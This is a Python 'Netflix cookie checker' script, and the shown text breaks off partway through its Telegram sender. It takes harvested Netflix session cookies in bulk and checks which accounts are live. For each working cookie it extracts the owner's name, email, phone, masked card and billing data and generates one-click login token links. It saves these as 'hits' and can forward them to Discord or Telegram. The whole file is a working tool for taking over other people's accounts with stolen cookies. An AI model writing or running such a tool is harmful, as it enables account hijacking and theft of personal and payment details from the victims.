#NETFLIX CHECKER BY HIDDEN-RHYTHM

import os, re, sys, json, time, html, string, random, base64, hashlib
import threading, unicodedata
from datetime import datetime, timedelta, timezone
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote

try:
    import requests
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CONFIG - EDIT THESE VALUES
THREADS = 30
TIMEOUT = 15

# Folders
COOKIES_FOLDER = "cookies"
OUTPUT_FOLDER = "output"
FAILED_FOLDER = "failed"
BROKEN_FOLDER = "broken"

# NFToken generation: "both" = PC + Mobile links, "pc" = PC only, "mobile" = mobile only, "false" = off
NFTOKEN_MODE = "both"
NFTOKEN_FOR_FREE = False  # Also generate NFTokens for free accounts?

# TXT Output Fields (True = show, False = hide)
SHOW_NAME = True
SHOW_EMAIL = True
SHOW_PLAN = True
SHOW_PRICE = True
SHOW_COUNTRY = True
SHOW_STREAMS = True
SHOW_QUALITY = True
SHOW_PROFILES = True
SHOW_MEMBER_SINCE = True
SHOW_NEXT_BILLING = True
SHOW_PAYMENT = True
SHOW_CARD = True
SHOW_PHONE = True
SHOW_HOLD_STATUS = True
SHOW_EXTRA_MEMBERS = True
SHOW_EMAIL_VERIFIED = True
SHOW_MEMBERSHIP_STATUS = True
SHOW_USER_GUID = True

# Discord Webhook
DISCORD_WEBHOOK_ENABLED = False #Change this to true if you want link of hits in discord, put webhook url below
DISCORD_WEBHOOK_URL = "YOUR DISCORD WEBHOOK"
DISCORD_WEBHOOK_MODE = "full"  # "full", "cookie", "nftoken"
DISCORD_WEBHOOK_PLANS = "all"  # "all" or comma-separated: "premium,standard"

# Telegram
TELEGRAM_ENABLED = False #Change this to true if you want link of hits in telegram
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
TELEGRAM_MODE = "full"  # "full", "cookie", "nftoken"
TELEGRAM_PLANS = "all"

# Emojis in output
EMOJIS_IN_TXT = False
EMOJIS_IN_WEBHOOK = True

# Display mode: "simple" or "log"
DISPLAY_MODE = "simple"

# CREATE FOLDERS
for folder in [COOKIES_FOLDER, OUTPUT_FOLDER, FAILED_FOLDER, BROKEN_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# COLORS
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; C = '\033[96m'; W = '\033[97m'; D = '\033[90m'
    X = '\033[0m'; BOLD = '\033[1m'
if os.name == 'nt': os.system('color')

# COUNTRY DATA
COUNTRIES = {
    "US":"USA","GB":"UK","CA":"Canada","AU":"Australia","DE":"Germany","FR":"France",
    "IN":"India","BR":"Brazil","MX":"Mexico","ES":"Spain","IT":"Italy","NL":"Netherlands",
    "SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland","JP":"Japan","KR":"South Korea",
    "AR":"Argentina","CO":"Colombia","CL":"Chile","PE":"Peru","TR":"Turkey","ZA":"South Africa",
    "NG":"Nigeria","KE":"Kenya","EG":"Egypt","SA":"Saudi Arabia","AE":"UAE","SG":"Singapore",
    "MY":"Malaysia","ID":"Indonesia","PH":"Philippines","TH":"Thailand","VN":"Vietnam",
    "PK":"Pakistan","BD":"Bangladesh","PL":"Poland","UA":"Ukraine","RO":"Romania",
    "PT":"Portugal","BE":"Belgium","CH":"Switzerland","AT":"Austria","IE":"Ireland",
    "NZ":"New Zealand","GR":"Greece","HK":"Hong Kong","TW":"Taiwan","IL":"Israel",
    "CZ":"Czech Republic","HU":"Hungary","RU":"Russia","MA":"Morocco","TN":"Tunisia",
    "DZ":"Algeria","EC":"Ecuador","UY":"Uruguay","CR":"Costa Rica","PA":"Panama",
    "HR":"Croatia","SK":"Slovakia","SI":"Slovenia","BG":"Bulgaria","LT":"Lithuania",
    "LV":"Latvia","EE":"Estonia","IS":"Iceland","LU":"Luxembourg","MT":"Malta","CY":"Cyprus",
}

def country_flag(code):
    if not code or len(code) != 2: return ""
    try: return chr(127397 + ord(code[0])) + chr(127397 + ord(code[1]))
    except: return ""

# MONTH ALIASES FOR DATE PARSING
MONTH_ALIASES = {
    "january":1,"janvier":1,"janeiro":1,"enero":1,"gennaio":1,"jan":1,"styczen":1,
    "february":2,"fevrier":2,"fevereiro":2,"febrero":2,"febbraio":2,"feb":2,"luty":2,
    "march":3,"mars":3,"marco":3,"marzo":3,"mar":3,"marzec":3,
    "april":4,"avril":4,"abril":4,"aprile":4,"apr":4,"kwiecien":4,
    "may":5,"mai":5,"mayo":5,"maggio":5,"maj":5,
    "june":6,"juin":6,"junio":6,"giugno":6,"jun":6,"czerwiec":6,
    "july":7,"juillet":7,"julio":7,"luglio":7,"jul":7,"lipiec":7,
    "august":8,"aout":8,"agosto":8,"agosto":8,"aug":8,"sierpien":8,
    "september":9,"septembre":9,"septiembre":9,"settembre":9,"sep":9,"wrzesien":9,
    "october":10,"octobre":10,"octubre":10,"ottobre":10,"oct":10,"pazdziernik":10,
    "november":11,"novembre":11,"noviembre":11,"novembre":11,"nov":11,"listopad":11,
    "december":12,"decembre":12,"diciembre":12,"dicembre":12,"dec":12,"grudzien":12,
}

# NFToken API CONFIG
NFTOKEN_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_PARAMS = {
    "appVersion":"15.48.1","idiom":"phone","iosVersion":"15.8.5","isTablet":"false",
    "languages":"en-US","locale":"en-US","maxDeviceWidth":"375","model":"saget",
    "modelType":"IPHONE8-1","odpAware":"true",
    "path":'["account","token","default"]',"pathFormat":"graph","pixelDensity":"2.0",
    "progressive":"false","responseFormat":"json","device_type":"NFAPPL-02-",
    "esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
}

# GLOBAL STATS
stats = {"total":0,"checked":0,"premium":0,"standard":0,"standard_with_ads":0,
         "basic":0,"mobile":0,"free":0,"extra_member_premium":0,
         "expired":0,"invalid":0,"duplicate":0,"errors":0}
lock = threading.Lock()
guid_lock = threading.Lock()
processed_emails = set()
run_folder = datetime.now().strftime("run_%Y-%m-%d_%H-%M-%S")

# HELPER FUNCTIONS
def decode_value(value):
    if value is None: return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace('\\/','/').replace('\\"','"').replace('\\n',' ').replace('\\t',' ')
    for _ in range(3):
        prev = cleaned
        cleaned = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1),16)), cleaned)
        cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1),16)), cleaned)
        if cleaned == prev: break
    cleaned = re.sub(r'\s+',' ',cleaned).strip()
    return cleaned or None

def normalize_plan_key(name):
    if not name: return "unknown"
    simplified = unicodedata.normalize("NFKD", name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+","_",simplified.lower(),flags=re.UNICODE).strip("_")
    return normalized or "unknown"

def parse_date(value):
    cleaned = decode_value(value)
    if not cleaned: return None
    for fmt in ["%Y-%m-%d","%Y-%m-%dT%H:%M:%S","%Y-%m-%dT%H:%M:%S.%f","%Y-%m-%dT%H:%M:%S%z"]:
        try: return datetime.strptime(cleaned,fmt)
        except: pass
    try: return datetime.fromisoformat(cleaned.replace("Z","+00:00"))
    except: pass
    nums = [int(x) for x in re.findall(r'\d+',cleaned)]
    if len(nums)>=3:
        try: return datetime(nums[0],nums[1],nums[2])
        except: pass
    lower = cleaned.lower()
    month = None
    for alias,m in MONTH_ALIASES.items():
        if alias in lower: month = m; break
    if month is None: return None
    year = None
    for n in nums:
        if 1900<=n<=3000: year = n; break
    if year is None: return None
    day = next((n for n in nums if 1<=n<=31 and n!=year),1)
    try: return datetime(year,month,day)
    except: return None

def format_date(value):
    dt = parse_date(value)
    return dt.strftime("%B %d, %Y").replace(" 0"," ") if dt else (decode_value(value) or "UNKNOWN")

def format_member_since(value):
    dt = parse_date(value)
    return dt.strftime("%B %Y") if dt else (decode_value(value) or "UNKNOWN")

def normalize_phone(value, country_code=None):
    cleaned = decode_value(value)
    if not cleaned: return None
    if str(cleaned).startswith("+"): return cleaned
    digits = re.sub(r'\D+','',str(cleaned))
    if not digits: return cleaned
    dial_map = {"IN":"91","US":"1","GB":"44","CA":"1","AU":"61","DE":"49","FR":"33"}
    cc = (decode_value(country_code) or "").strip().upper()
    prefix = dial_map.get(cc)
    if prefix and digits.startswith("0") and len(digits)>=10:
        return f"+{prefix}{digits.lstrip('0')}"
    return cleaned

# COOKIE PARSING
REQUIRED_COOKIES = ["NetflixId","SecureNetflixId"]
ALL_COOKIE_NAMES = {"NetflixId","SecureNetflixId","nfvdid","OptanonConsent",
                     "clSharedContext","profiles","cL","dsca","memclid","flwssn"}

def parse_cookie_string(content):
    """Parse ANY cookie format into dict"""
    cookies = OrderedDict()
    if not content or len(content)<20: return dict(cookies)
    
    # Netscape format
    if '\tTRUE\t' in content or '\tFALSE\t' in content:
        for line in content.split('\n'):
            line = line.strip()
            if line.startswith('#') or not line: continue
            parts = line.split('\t')
            if len(parts)>=7:
                name, value = parts[5].strip(), parts[6].strip()
                if name and value and len(value)>3: cookies[name] = value
    
    # Semicolon format
    if not cookies:
        for part in content.replace('\n',';').split(';'):
            part = part.strip()
            if '=' in part:
                name, value = part.split('=',1)
                name, value = name.strip(), value.strip()
                if name and value and len(value)>3: cookies[name] = value
    
    # JSON format
    if not cookies:
        try:
            data = json.loads(content)
            items = data if isinstance(data,list) else [data]
            for item in items:
                if isinstance(item,dict) and 'name' in item and 'value' in item:
                    cookies[item['name']] = str(item['value'])
        except: pass
    
    # Single key=value per line
    if not cookies:
        for line in content.split('\n'):
            line = line.strip()
            if '=' in line and '\t' not in line and ';' not in line:
                name, value = line.split('=',1)
                name, value = name.strip(), value.strip()
                if name and value and len(value)>5: cookies[name] = value
    
    return dict(cookies)

def extract_cookie_sets(filepath):
    """Extract all valid cookie sets from a file"""
    try:
        with open(filepath,'r',encoding='utf-8',errors='ignore') as f:
            content = f.read()
    except:
        try:
            with open(filepath,'r',encoding='latin-1',errors='ignore') as f:
                content = f.read()
        except: return []
    
    all_sets = []
    
    # Try splitting by double newline
    blocks = re.split(r'\n\s*\n', content)
    
    for block in blocks:
        cookies = parse_cookie_string(block)
        if cookies and all(c in cookies for c in REQUIRED_COOKIES):
            all_sets.append(cookies)
    
    # Try whole file
    if not all_sets:
        cookies = parse_cookie_string(content)
        if cookies and all(c in cookies for c in REQUIRED_COOKIES):
            all_sets.append(cookies)
    
    # Try finding NetflixId blocks
    if not all_sets:
        netflix_id_positions = [m.start() for m in re.finditer(r'NetflixId[=:\s]', content)]
        for pos in netflix_id_positions:
            chunk = content[max(0,pos-500):pos+2000]
            cookies = parse_cookie_string(chunk)
            if cookies and all(c in cookies for c in REQUIRED_COOKIES):
                all_sets.append(cookies)
    
    return all_sets

def format_cookies_netscape(cookies):
    """Format cookies as Netscape string"""
    lines = []
    for name, value in cookies.items():
        lines.append(f".netflix.com\tTRUE\t/\tTRUE\t9999999999\t{name}\t{value}")
    return '\n'.join(lines)

# ACCOUNT INFO EXTRACTION
def extract_account_info(text):
    """Extract ALL account info from Netflix page HTML/JSON"""
    info = {}
    
    # Try GraphQL payload first
    try:
        payload = json.loads(text)
        if isinstance(payload,dict):
            data = payload.get('data',{})
            growth = data.get('growthAccount',{}) or data.get('growth_account',{})
            profile = data.get('currentProfile',{}) or data.get('current_profile',{})
            current_plan = ((growth.get('currentPlan') or {}).get('plan') or {})
            next_plan = ((growth.get('nextPlan') or {}).get('plan') or {})
            next_billing = growth.get('nextBillingDate',{}) or growth.get('next_billing_date',{})
            hold_meta = growth.get('growthHoldMetadata',{}) or growth.get('growth_hold_metadata',{})
            phone_obj = growth.get('growthLocalizablePhoneNumber',{}) or growth.get('growth_localizable_phone_number',{})
            raw_phone = phone_obj.get('rawPhoneNumber',{}) or phone_obj.get('raw_phone_number',{})
            payment_methods = growth.get('growthPaymentMethods',[]) or growth.get('growth_payment_methods',[])
            payment = payment_methods[0] if payment_methods and isinstance(payment_methods[0],dict) else {}
            profiles = growth.get('profiles',[]) or []
            
            info['email'] = decode_value(profile.get('email') or (profile.get('growthEmail',{}) or {}).get('email'))
            info['accountOwnerName'] = decode_value(profile.get('name'))
            info['countryOfSignup'] = decode_value((growth.get('countryOfSignUp',{}) or {}).get('code'))
            info['memberSince'] = decode_value(growth.get('memberSince'))
            info['nextBillingDate'] = decode_value(next_billing.get('localDate') or next_billing.get('date'))
            info['userGuid'] = decode_value(growth.get('ownerGuid') or profile.get('guid'))
            info['membershipStatus'] = decode_value(growth.get('membershipStatus'))
            info['localizedPlanName'] = decode_value(current_plan.get('name') or next_plan.get('name'))
            
            # Price
            price = current_plan.get('priceDisplay') or current_plan.get('displayPrice') or current_plan.get('formattedPrice')
            if not price and isinstance(current_plan.get('price'),dict):
                price = current_plan['price'].get('displayValue') or current_plan['price'].get('formatted')
            info['planPrice'] = decode_value(price)
            
            info['videoQuality'] = decode_value(current_plan.get('videoQuality'))
            info['maxStreams'] = current_plan.get('maxStreams')
            
            # Hold status
            hold = hold_meta.get('isUserOnHold') or hold_meta.get('holdStatus') or hold_meta.get('isOnHold')
            info['holdStatus'] = "Yes" if hold else ("No" if hold is False else None)
            
            # Payment
            info['paymentMethodType'] = decode_value(payment.get('paymentOptionLogo',{}).get('paymentOptionLogo') if isinstance(payment.get('paymentOptionLogo'),dict) else payment.get('paymentOptionLogo'))
            if not info['paymentMethodType']:
                info['paymentMethodType'] = decode_value(growth.get('payer'))
            if 'Card' in str(payment.get('__typename','')):
                info['paymentMethodType'] = 'CC'
                info['maskedCard'] = decode_value(payment.get('displayText'))
            
            # Phone
            if isinstance(raw_phone,dict):
                phone_digits = (raw_phone.get('phoneNumberDigits',{}) or {}).get('value') if isinstance(raw_phone.get('phoneNumberDigits'),dict) else raw_phone.get('phoneNumberDigits')
                info['phoneNumber'] = decode_value(phone_digits)
                info['phoneCountryCode'] = decode_value(raw_phone.get('countryCode'))
                info['phoneVerified'] = "Yes" if raw_phone.get('isVerified') else ("No" if raw_phone.get('isVerified') is False else None)
            
            # Email verified
            email_meta = profile.get('growthEmail',{}) or {}
            info['emailVerified'] = "Yes" if email_meta.get('isVerified') else ("No" if email_meta.get('isVerified') is False else None)
            
            # Extra members
            features = []
            for plan in [current_plan,next_plan]:
                for feat in (plan.get('availableFeatures') or []):
                    if isinstance(feat,dict) and feat.get('type'):
                        features.append(str(feat['type']).upper())
            info['showExtraMemberSection'] = "Yes" if 'EXTRA_MEMBER' in features else ("No" if features else None)
            
            # Profiles
            profile_names = []
            for p in profiles:
                if isinstance(p,dict):
                    name = decode_value(p.get('name'))
                    if name and name not in profile_names:
                        profile_names.append(name)
            if profile_names:
                info['profiles'] = ", ".join(profile_names)
                info['profileCount'] = len(profile_names)
            
            # Check if info is complete
            if info.get('countryOfSignup') and info.get('localizedPlanName'):
                return info
    except: pass
    
    # Fallback: regex extraction from HTML/JSON text
    patterns = {
        'email': [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"'],
        'accountOwnerName': [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"'],
        'countryOfSignup': [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"'],
        'memberSince': [r'"memberSince":\s*"([^"]+)"'],
        'nextBillingDate': [r'"nextBillingDate"\s*:\s*"([^"]+)"', r'"nextBilling"[^}]*"value"\s*:\s*"([^"]+)"'],
        'userGuid': [r'"userGuid":\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"'],
        'membershipStatus': [r'"membershipStatus":\s*"([^"]+)"'],
        'localizedPlanName': [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"'],
        'planPrice': [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"formattedPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"'],
        'maxStreams': [r'"maxStreams"\s*:\s*"?(\d+)"?'],
        'videoQuality': [r'"videoQuality"\s*:\s*"([^"]+)"'],
        'paymentMethodType': [r'"paymentMethod"\s*:\s*"([^"]+)"'],
        'maskedCard': [r'"displayText"\s*:\s*"([^"]+)"', r'"lastFour"\s*:\s*"([^"]+)"', r'"maskedCard"\s*:\s*"([^"]+)"'],
        'holdStatus': [r'"holdStatus"\s*:\s*(true|false)', r'"isUserOnHold"\s*:\s*(true|false)', r'"isOnHold"\s*:\s*(true|false)'],
        'showExtraMemberSection': [r'"showExtraMemberSection"\s*:\s*(true|false)'],
        'emailVerified': [r'"emailVerified"\s*:\s*(true|false)', r'"isEmailVerified"\s*:\s*(true|false)'],
        'phoneNumber': [r'"phoneNumberDigits"[^}]*"value"\s*:\s*"([^"]+)"', r'"phoneNumber"\s*:\s*"([^"]+)"'],
    }
    
    for key, pats in patterns.items():
        for pat in pats:
            match = re.search(pat, text, re.IGNORECASE)
            if match:
                val = match.group(1)
                if val.lower() == 'true': info[key] = "Yes"
                elif val.lower() == 'false': info[key] = "No"
                else: info[key] = val
                break
    
    # Extract profiles
    profile_names = []
    for match in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', text):
        name = decode_value(match.group(1))
        if name and name not in profile_names: profile_names.append(name)
    if profile_names:
        info['profiles'] = ", ".join(profile_names)
        info['profileCount'] = len(profile_names)
    
    return info

# PLAN DETECTION
def derive_plan(info, is_subscribed):
    """Derive plan type from account info"""
    plan_name = decode_value(info.get('localizedPlanName','')) or ''
    quality = decode_value(info.get('videoQuality','')) or ''
    streams = info.get('maxStreams','')
    
    try: streams_int = int(str(streams).rstrip('}'))
    except: streams_int = 0
    
    normalized = normalize_plan_key(plan_name)
    
    # Premium aliases
    premium_keys = {'premium','premium_extra_member','extra_member_premium',
                     'cao_cap','premium_plan','プレミアム','프리미엄','高級','高级'}
    standard_ads_keys = {'standard_with_ads','standardwithads','estandar_con_anuncios',
                          'padrao_com_anuncios','광고형_스탠다드'}
    standard_keys = {'standard','estandar','padrao','標準','标准','스탠다드','スタンダード'}
    basic_keys = {'basic','basico','basique','basis','基本','베이직','ベーシック'}
    mobile_keys = {'mobile','movil','ponsel','seluler','มือถือ','모바일','モバイル'}
    
    if normalized in premium_keys: return 'premium','Premium'
    if normalized in standard_ads_keys: return 'standard_with_ads','Standard With Ads'
    if normalized in standard_keys: return 'standard','Standard'
    if normalized in basic_keys: return 'basic','Basic'
    if normalized in mobile_keys: return 'mobile','Mobile'
    
    if streams_int >= 4 or 'uhd' in quality.lower() or '4k' in quality.lower():
        return 'premium','Premium'
    if streams_int >= 2 or 'hd' in quality.lower():
        return 'standard','Standard'
    if streams_int == 1:
        return 'basic','Basic'
    
    if not is_subscribed: return 'free','Free'
    return 'unknown','Unknown'

def is_subscribed_account(info):
    status = normalize_plan_key(decode_value(info.get('membershipStatus','')) or '')
    if status == 'current_member': return True
    plan = decode_value(info.get('localizedPlanName','')) or ''
    return 'extra member' in plan.lower()

def is_extra_member(info):
    plan = decode_value(info.get('localizedPlanName','')) or ''
    return 'extra member' in plan.lower() or 'miembro extra' in plan.lower()

def is_on_hold(info):
    hold = decode_value(info.get('holdStatus','')) or ''
    if hold.lower() in ['yes','true','1']: return True
    status = normalize_plan_key(decode_value(info.get('membershipStatus','')) or '')
    return any(t in status for t in ['hold','past_due','payment_retry','paused','suspend'])

# ============================================================
# NFTOKEN GENERATION
# ============================================================
def generate_nftoken(cookies):
    """Generate NFToken for one-click login"""
    netflix_id = cookies.get('NetflixId','')
    if not netflix_id: return None, "Missing NetflixId"
    
    headers = {
        "User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "Cookie":f"NetflixId={netflix_id}",
        "x-netflix.request.attempt":"1",
        "x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version":"15.48.1",
        "x-netflix.context.form-factor":"phone",
        "x-netflix.client.appversion":"15.48.1",
        "x-netflix.context.max-device-width":"375",
        "x-netflix.client.type":"argo",
        "x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales":"en-US",
        "x-netflix.client.iosversion":"15.8.5",
        "accept-language":"en-US;q=1",
        "x-netflix.context.os-version":"15.8.5",
        "x-netflix.context.ui-flavor":"argo",
    }
    
    try:
        response = requests.get(NFTOKEN_URL, params=NFTOKEN_PARAMS, headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            data = response.json()
            token_data = ((((data.get('value') or {}).get('account') or {}).get('token') or {}).get('default') or {})
            token = decode_value(token_data.get('token'))
            expires = token_data.get('expires')
            if token:
                expiry_str = "1 hour"
                if isinstance(expires,(int,float)):
                    ts = int(expires)
                    if len(str(abs(ts)))==13: ts //= 1000
                    expiry_str = datetime.fromtimestamp(ts,tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                return {"token":token,"expires_at_utc":expiry_str}, None
        return None, f"NFToken API error ({response.status_code})"
    except Exception as e:
        return None, str(e)

def format_nftoken_links(token_data):
    """Format NFToken links"""
    if not token_data or not token_data.get('token'): return []
    token = token_data['token']
    links = []
    if NFTOKEN_MODE in ["both","pc"]:
        links.append(("🖥️ PC Login", f"https://netflix.com/?nftoken={token}"))
    if NFTOKEN_MODE in ["both","mobile"]:
        links.append(("📱 Phone Login", f"https://netflix.com/unsupported?nftoken={token}"))
    return links

# ============================================================
# OUTPUT FORMATTING
# ============================================================
def format_account_output(info, cookies, is_subscribed, nftoken_data=None):
    """Format account info for output file"""
    plan_key, plan_name = derive_plan(info, is_subscribed)
    status = plan_name if is_subscribed else "Free"
    
    lines = [f"NETFLIX {'HIT' if is_subscribed else 'FREE'} :👇", ""]
    
    fields = [
        (SHOW_NAME, "Name", info.get('accountOwnerName')),
        (SHOW_EMAIL, "Email", info.get('email')),
        (SHOW_COUNTRY, "Country", lambda v: f"{v} {country_flag(v)}" if v else "UNKNOWN", info.get('countryOfSignup')),
        (SHOW_PLAN, "Plan", plan_name),
        (SHOW_PRICE, "Price", info.get('planPrice')),
        (SHOW_STREAMS, "Streams", str(info.get('maxStreams','')).rstrip('}')),
        (SHOW_QUALITY, "Quality", info.get('videoQuality')),
        (SHOW_PROFILES, f"Profiles ({info.get('profileCount',0)})", info.get('profiles')),
        (SHOW_MEMBER_SINCE, "Member Since", format_member_since(info.get('memberSince'))),
        (SHOW_NEXT_BILLING, "Next Billing", format_date(info.get('nextBillingDate'))),
        (SHOW_PAYMENT, "Payment", info.get('paymentMethodType')),
        (SHOW_CARD, "Card", info.get('maskedCard')),
        (SHOW_PHONE, "Phone", normalize_phone(info.get('phoneNumber'), info.get('countryOfSignup'))),
        (SHOW_HOLD_STATUS, "Hold Status", info.get('holdStatus')),
        (SHOW_EXTRA_MEMBERS, "Extra Members", info.get('showExtraMemberSection')),
        (SHOW_EMAIL_VERIFIED, "Email Verified", info.get('emailVerified')),
        (SHOW_MEMBERSHIP_STATUS, "Membership Status", info.get('membershipStatus')),
        (SHOW_USER_GUID, "User GUID", info.get('userGuid')),
    ]
    
    for field in fields:
        if field[0]:
            if len(field) == 3:
                show, label, value = field
                if value:
                    lines.append(f"{label}: {decode_value(value) or value}")
            else:
                show, label, formatter, value = field
                if value:
                    formatted = formatter(value) if callable(formatter) else decode_value(value)
                    if formatted:
                        lines.append(f"{label}: {formatted}")
    
    # NFToken section
    if is_subscribed and NFTOKEN_MODE != "false" and nftoken_data and nftoken_data.get('token'):
        lines.append("")
        lines.append("-" * 98)
        lines.append("")
        lines.append("NFToken DETAILS :👇")
        lines.append("")
        for label, link in format_nftoken_links(nftoken_data):
            lines.append(f"{label}: {link}")
        if nftoken_data.get('expires_at_utc'):
            lines.append(f"Valid Till (UTC): {nftoken_data['expires_at_utc']}")
    
    lines.append("")
    lines.append("-" * 98)
    lines.append("")
    lines.append("Checker By: github.com/Aryan-1267 | Converted for Butter")
    lines.append("Netflix COOKIE :👇")
    lines.append("")
    lines.append(format_cookies_netscape(cookies))
    lines.append("")
    
    return '\n'.join(lines), plan_key, plan_name

# WEBHOOK FUNCTIONS
def is_plan_allowed(plan_key, allowed_plans):
    if allowed_plans == "all": return True
    if isinstance(allowed_plans, str):
        allowed = [p.strip().lower() for p in allowed_plans.split(',')]
        return (plan_key or '').lower() in allowed
    return True

def send_discord(info, cookies_str, is_subscribed, plan_key, plan_name, nftoken_data=None):
    if not DISCORD_WEBHOOK_ENABLED or not DISCORD_WEBHOOK_URL: return
    if not is_plan_allowed(plan_key, DISCORD_WEBHOOK_PLANS): return
    
    country = decode_value(info.get('countryOfSignup','')) or 'UNKNOWN'
    flag = country_flag(country)
    
    if DISCORD_WEBHOOK_MODE == "cookie":
        message = f"**[Netflix Cookie](https://github.com/Hidden-Rhythm)**\n\n```{cookies_str[:1900]}```"
    elif DISCORD_WEBHOOK_MODE == "nftoken" and nftoken_data and nftoken_data.get('token'):
        message = f"**[Netflix NFToken](https://github.com/Hidden-Rhythm)**\n\nPlan: {plan_name}\nCountry: {country} {flag}\n"
        for label, link in format_nftoken_links(nftoken_data):
            message += f"\n**{label}:** [Click here]({link})"
    else:
        lines = [f"# [Netflix Cookie](https://github.com/Hidden-Rhythm)", "", "**Cookie details**"]
        lines.append(f"**📌 Status:** {'Subscribed' if is_subscribed else 'Free'}")
        if info.get('accountOwnerName'): lines.append(f"**👤 Name:** {decode_value(info['accountOwnerName'])}")
        if info.get('email'): lines.append(f"**📧 Email:** {decode_value(info['email'])}")
        lines.append(f"**🌍 Country:** {country} {flag}")
        lines.append(f"**📦 Plan:** {plan_name}")
        if info.get('planPrice'): lines.append(f"**💰 Price:** {decode_value(info['planPrice'])}")
        if info.get('maxStreams'): lines.append(f"**📺 Streams:** {str(info['maxStreams']).rstrip('}')}")
        if info.get('profiles'): lines.append(f"**🎭 Profiles ({info.get('profileCount',0)}):** {decode_value(info['profiles'])}")
        if nftoken_data and nftoken_data.get('token'):
            lines.append("")
            for label, link in format_nftoken_links(nftoken_data):
                lines.append(f"**{label}:** [Click here]({link})")
        lines.extend(["","**[Github](https://github.com/Hidden-Rhythm)**"])
        message = '\n'.join(lines)
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={
            "content": message[:2000], "flags": 4,
            "username": "Netflix Checker",
            "avatar_url": "https://i.ibb.co/XZLnRkFs/netflix-logo-png-2616.png"
        }, timeout=20)
    except: pass

def send_telegram(info, cookies_str, is_subscribed, plan_key, plan_name, nftoken_data=None):
    if not TELEGRAM_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
    if not is_plan_allowed(plan_key, TELEGRAM_PLANS): return
    
    country = decode_value(info.get('countryOfSignup','')) or 'UNKNOWN'
    
    if TELEGRAM_MODE == "cookie":
        message = f'<b><a href="https://github.com/Hidden-Rhythm">Netflix Cookie</a></b>\n\n<code>{html.escape(cookies_str[:3500])}</code>'
    elif TELEGRAM_MODE == "nftoken" and nftoken_data and nftoken_data.get('token'):
        message = f'<b><a href="https://github.com/Hidden-Rhythm">Netflix NFToken</a></b>\n\n<b>Plan:</b> {html.escape(plan_name)}\n<b>Country:</b> {html.escape(country)}'
        for label, link in format_nftoken_links(nftoken_data):
            message += f'\n<b>{html.escape(label)}:</b> <a href="{html.escape(link)}">Click here</a>'
    else:
        lines = ['<b><a href="https://github.com/Hidden-Rhythm">Netflix Cookie</a></b>', '', '<b>Cookie details</b>']
        lines.append(f'<b>📌 Status:</b> {"Subscribed" if is_subscribed else "Free"}')
        if info.get('email'): lines.append(f'<b>📧 Email:</b> {html.escape(decode_value(info["email"]) or "")}')
        lines.append(f'<b>🌍 Country:</b> {html.escape(country)}')
        lines.append(f'<b>📦 Plan:</b> {html.escape(plan_name)}')
        if nftoken_data and nftoken_data.get('token'):
            for label, link in format_nftoken_links(nftoken_data):
                lines.append(f'<b>{html.escape(label)}:</b> <a href="{html.escape(link)}">Click here</a>')
        message = '\n'.join(lines)
    
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
